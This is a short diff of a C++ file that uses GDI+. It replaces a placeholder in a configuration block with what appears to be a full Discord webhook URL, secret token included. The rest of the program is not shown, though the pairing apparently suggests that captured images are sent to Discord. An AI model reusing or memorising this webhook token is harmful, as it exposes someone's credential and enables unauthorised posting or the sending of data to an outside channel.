@@ -13,7 +13,7 @@ using namespace Gdiplus;
 
 // --- CONFIGURATION ---
 // Replace this with your actual Discord Webhook URL
-std::string WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+std::string WEBHOOK_URL = "https://discord.com/api/webhooks/1497212800219484180/ffoUppkjBoo9PJMX8CgLtFigvLSSMFk8R0MY4hLTd-7aIV1Bzm1xggX3mpRD2c20Eklo";
 // ---------------------
 
 std::string g_MessageID = "";
